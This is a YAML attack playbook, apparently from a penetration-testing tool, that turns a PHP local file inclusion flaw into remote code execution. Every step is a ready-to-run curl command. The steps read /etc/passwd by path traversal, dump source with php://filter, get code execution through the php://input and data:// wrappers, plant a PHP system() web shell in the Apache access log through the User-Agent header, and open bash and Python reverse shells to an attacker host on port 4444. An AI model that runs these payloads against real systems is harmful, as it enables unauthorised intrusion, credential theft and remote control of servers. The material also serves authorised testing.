id: lfi-to-rce-log-poison
name: "Web → Shell — LFI + log poisoning → RCE"
description: >
  Local File Inclusion in PHP/JSP apps lets you read arbitrary files. The
  classic upgrade to RCE: write PHP code into a log the web server
  controls, then include the log via LFI. Works on Apache access.log,
  /proc/self/environ, mail logs, session files.
tags: [web, lfi, log-poisoning, rce, php]
difficulty: medium

inputs:
  - name: target_url
    description: "Vulnerable URL with the LFI parameter, e.g. http://target/index.php?page="
    required: true

steps:
  - id: confirm_lfi
    name: "Confirm LFI (read a known file)"
    inline_command: "curl -s '<url>../../../../etc/passwd' | head -10"
    inputs:
      url: "${target_url}"
    notes: |
      Try `../../../../etc/passwd`, `/etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`.
      The php://filter trick gives you source — read every script to find
      credentials, db config, and other endpoints.

  - id: php_wrapper_check
    name: "Check for PHP wrappers"
    inline_command: |
      curl -s '<url>php://filter/convert.base64-encode/resource=index.php' | base64 -d
      curl -s -d '<?php system($_GET["c"]); ?>' '<url>php://input&c=id'
      curl -s '<url>data:text/plain,<?php phpinfo(); ?>'
    inputs:
      url: "${target_url}"
    notes: |
      php://input + data:// often give straight RCE without log poisoning.
      Try these first — much cleaner.

  - id: log_poison
    name: "Poison Apache access.log (User-Agent injection)"
    inline_command: "curl -A '<?php system($_GET[\"c\"]); ?>' '<base_url>'"
    inputs:
      base_url: "${target_url}"
    notes: |
      Sets User-Agent to PHP code; Apache writes it verbatim into the log.
      Default log paths: /var/log/apache2/access.log, /var/log/httpd/access_log,
      /var/log/nginx/access.log.

  - id: trigger_inclusion
    name: "Include the poisoned log to execute"
    inline_command: "curl '<url>../../../../var/log/apache2/access.log&c=id'"
    inputs:
      url: "${target_url}"
    notes: |
      Output: `uid=33(www-data)...` interspersed with log lines. If you see
      it — RCE confirmed. Now drop a reverse shell:
        c=bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'  (URL-encode!)

  - id: stable_shell
    name: "Upgrade to a reverse shell"
    inline_command: "curl '<url>../../../../var/log/apache2/access.log&c=$(python3 -c \"import socket,os,pty; s=socket.socket(); s.connect((\\\"<lhost>\\\",<lport>)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\\\"/bin/bash\\\")\")'"
    inputs:
      url: "${target_url}"
      lhost: "${attacker_ip}"
      lport: "4444"
    notes: |
      Catch with `nc -lvnp <lport>` then stabilize (CTRL+Z, stty raw -echo;
      fg, export TERM=xterm).

references:
  - title: "HackTricks — LFI / RFI"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html"
  - title: "PHP wrappers"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html"
